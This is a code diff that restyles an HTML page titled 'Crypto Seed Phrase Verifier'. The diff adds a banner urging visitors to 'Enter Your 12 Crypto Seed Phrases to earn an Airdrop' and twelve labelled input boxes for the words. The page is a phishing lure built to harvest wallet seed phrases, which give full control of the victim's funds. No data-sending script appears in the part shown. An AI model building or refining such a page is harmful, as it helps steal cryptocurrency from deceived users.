@@ -6,63 +6,100 @@
     <title>Crypto Seed Phrase Verifier</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 20px;
+            background-color: #f9fafb;
+            color: #333;
         }
         .container {
             max-width: 800px;
             margin: auto;
             display: grid;
             grid-template-columns: 1fr 1fr; /* Two-column layout */
-            gap: 20px; /* Space between columns and rows */
+            gap: 20px; /* Space between columns */
         }
         .column {
             display: flex;
             flex-direction: column;
+            gap: 15px; /* Space between input fields */
+        }
+        label {
+            font-size: 14px;
+            font-weight: bold;
+            color: #555;
         }
         input[type="text"] {
             width: 100%;
-            padding: 10px;
-            margin: 5px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
+            padding: 12px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+        input[type="text"]:focus {
+            border-color: #007BFF;
+            outline: none;
         }
         button {
-            padding: 10px 20px;
+            padding: 12px 24px;
             background-color: #007BFF;
             color: white;
             border: none;
-            border-radius: 4px;
+            border-radius: 8px;
+            font-size: 16px;
             cursor: pointer;
             width: fit-content;
             margin: 20px auto 0 auto; /* Center the button */
+            transition: background-color 0.3s ease;
         }
         button:hover {
             background-color: #0056b3;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #2d3748;
         }
     </style>
 </head>
 <body>
 
+<div class="header">
+    <h1>Enter Your 12 Crypto Seed Phrases to earn an Airdrop</h1>
+    <p>Please fill in all 12 seed words below.</p>
+</div>
+
 <div class="container">
     <!-- Left Column -->
     <div class="column">
-        <input type="text" id="word1" placeholder="Word 1">
-        <input type="text" id="word2" placeholder="Word 2">
-        <input type="text" id="word3" placeholder="Word 3">
-        <input type="text" id="word4" placeholder="Word 4">
-        <input type="text" id="word5" placeholder="Word 5">
-        <input type="text" id="word6" placeholder="Word 6">
+        <label for="word1">Word 1</label>
+        <input type="text" id="word1" placeholder="Enter Word 1">
+        <label for="word2">Word 2</label>
+        <input type="text" id="word2" placeholder="Enter Word 2">
+        <label for="word3">Word 3</label>
+        <input type="text" id="word3" placeholder="Enter Word 3">
+        <label for="word4">Word 4</label>
+        <input type="text" id="word4" placeholder="Enter Word 4">
+        <label for="word5">Word 5</label>
+        <input type="text" id="word5" placeholder="Enter Word 5">
+        <label for="word6">Word 6</label>
+        <input type="text" id="word6" placeholder="Enter Word 6">
     </div>
 
     <!-- Right Column -->
     <div class="column">
-        <input type="text" id="word7" placeholder="Word 7">
-        <input type="text" id="word8" placeholder="Word 8">
-        <input type="text" id="word9" placeholder="Word 9">
-        <input type="text" id="word10" placeholder="Word 10">
-        <input type="text" id="word11" placeholder="Word 11">
-        <input type="text" id="word12" placeholder="Word 12">
+        <label for="word7">Word 7</label>
+        <input type="text" id="word7" placeholder="Enter Word 7">
+        <label for="word8">Word 8</label>
+        <input type="text" id="word8" placeholder="Enter Word 8">
+        <label for="word9">Word 9</label>
+        <input type="text" id="word9" placeholder="Enter Word 9">
+        <label for="word10">Word 10</label>
+        <input type="text" id="word10" placeholder="Enter Word 10">
+        <label for="word11">Word 11</label>
+        <input type="text" id="word11" placeholder="Enter Word 11">
+        <label for="word12">Word 12</label>
+        <input type="text" id="word12" placeholder="Enter Word 12">
     </div>
 </div>
 
